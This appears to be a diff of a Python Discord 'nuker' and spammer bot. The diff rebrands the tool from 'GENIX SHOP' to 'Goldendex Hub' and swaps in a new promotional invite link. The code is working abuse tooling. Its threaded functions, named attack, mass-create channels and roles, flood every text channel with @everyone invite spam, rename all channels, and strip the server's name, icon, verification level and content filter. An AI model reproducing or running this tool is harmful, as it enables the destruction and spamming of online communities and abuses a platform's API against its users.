@@ -18,12 +18,9 @@ color_6 = "\x1b[35m"
 color_7 = "\x1b[36m"
 
 command_banner = f"""
-		{color_5}┏━┓┏━┓┏━━━┓┏━━━┓┏┓━┏┓┏━━┓┏━┓━┏┓┏━━━┓
-		┃┃┗┛┃┃┃┏━┓┃┃┏━┓┃┃┃━┃┃┗┫┣┛┃┃┗┓┃┃┃┏━━┛
-		{color_1}┃┏┓┏┓┃┃┃━┃┃┃┃━┗┛┃┗━┛┃━┃┃━┃┏┓┗┛┃┃┗━━┓
-		┃┃┃┃┃┃┃┗━┛┃┃┃━┏┓┃┏━┓┃━┃┃━┃┃┗┓┃┃┃┏━━┛
-		{color_5}┃┃┃┃┃┃┃┏━┓┃┃┗━┛┃┃┃━┃┃┏┫┣┓┃┃━┃┃┃┃┗━━┓
-		┗┛┗┛┗┛┗┛━┗┛┗━━━┛┗┛━┗┛┗━━┛┗┛━┗━┛┗━━━┛
+		{color_5} Goldendex Hub
+		{color_1} TPR.GOLDENDEX-HUB.lua
+		{color_5} https://discord.gg/WcXKaNryFQ
 {color_2}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                       {color_4}<---- {color_3}[ {color_1}COMMANDS {color_3}] {color_4}---->
   
@@ -53,7 +50,7 @@ def run(tokens):
 	async def newc(ctx):
 		await ctx.message.delete()
 		def attack(guild,token):
-			requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": f"Bot {token}"},json={"type":0,"name":"genixshop","permission_overwrites":[]})
+			requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": f"Bot {token}"},json={"type":0,"name":"Goldendex Hub","permission_overwrites":[]})
 		for _ in range(50+1):
 			threading.Thread(target=attack, args=[ctx.guild.id,tokens]).start()
 			
@@ -84,7 +81,7 @@ def run(tokens):
 	async def newd(ctx):
 		await ctx.message.delete()
 		def attack(guild,token):
-			requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles",headers={"authorization": f"Bot {token}"},json={"name":"GENIX SHOP","color":0,"permissions":"0"})
+			requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles",headers={"authorization": f"Bot {token}"},json={"name":"Goldendex Hub","color":0,"permissions":"0"})
 		for _ in range(20):
 			threading.Thread(target=attack, args=[ctx.guild.id,tokens]).start()
 			
@@ -117,7 +114,7 @@ def run(tokens):
 			for channel in ctx.guild.text_channels:
 				try:
 					def attack(id,token):
-						requests.post(f"https://discord.com/api/v9/channels/{id}/messages",headers={"authorization": f"Bot {token}"},json={"content": "@everyone @here\nhttps://discord.gg/XyJG87495q"})
+						requests.post(f"https://discord.com/api/v9/channels/{id}/messages",headers={"authorization": f"Bot {token}"},json={"content": "@everyone @here\nhttps://discord.gg/WcXKaNryFQ"})
 					threading.Thread(target=attack, args=[channel.id,tokens]).start()
 				except:
 					pass
@@ -128,7 +125,7 @@ def run(tokens):
 		for channel in ctx.guild.channels:
 			try:
 				def attack(id,token):
-					requests.patch(f"https://discord.com/api/v9/channels/{id}",headers={"authorization": f"Bot {token}"},json={"name":"genixshop_edition","type":0,"topic":"","bitrate":64000,"user_limit":0,"nsfw":False,"flags":0,"rate_limit_per_user":0})
+					requests.patch(f"https://discord.com/api/v9/channels/{id}",headers={"authorization": f"Bot {token}"},json={"name":"Goldendex Hub_edition","type":0,"topic":"","bitrate":64000,"user_limit":0,"nsfw":False,"flags":0,"rate_limit_per_user":0})
 				threading.Thread(target=attack, args=[channel.id,tokens]).start()
 			except:
 				pass
@@ -136,7 +133,7 @@ def run(tokens):
 	@bot.command()
 	async def autoplay(ctx):
 		await ctx.message.delete()
-		requests.patch(f"https://discord.com/api/v9/guilds/{ctx.guild.id}",headers={"authorization": f"Bot {tokens}"},json={"name":"GENIX SHOP | CallBack","description":None,"icon":None,"splash":None,"banner":None,"home_header":None,"afk_channel_id":None,"afk_timeout":300,"system_channel_id":None,"verification_level":0,"default_message_notifications":0,"explicit_content_filter":0,"system_channel_flags":0,"public_updates_channel_id":None,"safety_alerts_channel_id":None,"premium_progress_bar_enabled":False})
+		requests.patch(f"https://discord.com/api/v9/guilds/{ctx.guild.id}",headers={"authorization": f"Bot {tokens}"},json={"name":"Goldendex Hub ","description":None,"icon":None,"splash":None,"banner":None,"home_header":None,"afk_channel_id":None,"afk_timeout":300,"system_channel_id":None,"verification_level":0,"default_message_notifications":0,"explicit_content_filter":0,"system_channel_flags":0,"public_updates_channel_id":None,"safety_alerts_channel_id":None,"premium_progress_bar_enabled":False})
 		for channel in ctx.guild.channels:
 			try:
 				def attack(id,token):
@@ -144,11 +141,11 @@ def run(tokens):
 				threading.Thread(target=attack, args=[channel.id,tokens]).start()
 			except:
 				def attack(guild,token):
-					requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": f"Bot {token}"},json={"type":0,"name":"genixshop","permission_overwrites":[]})
+					requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": f"Bot {token}"},json={"type":0,"name":"Goldendex Hub","permission_overwrites":[]})
 				for _ in range(50+1):
 					threading.Thread(target=attack, args=[ctx.guild.id,tokens]).start()
 		def attack(guild,token):
-			requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": f"Bot {token}"},json={"type":0,"name":"genixshop","permission_overwrites":[]})
+			requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": f"Bot {token}"},json={"type":0,"name":"Goldendex Hub","permission_overwrites":[]})
 		for _ in range(50+1):
 			threading.Thread(target=attack, args=[ctx.guild.id,tokens]).start()
 			
@@ -161,7 +158,7 @@ def run(tokens):
 
 def home():
 	os.system("clear")
-	print("      CREATE BY GENIX SHOP | DISCORD SPAMMER")
+	print("      CREATE BY Goldendex Hub       ")
 	print()
 	token = input("  [>] TOKEN  : ")
 	print()
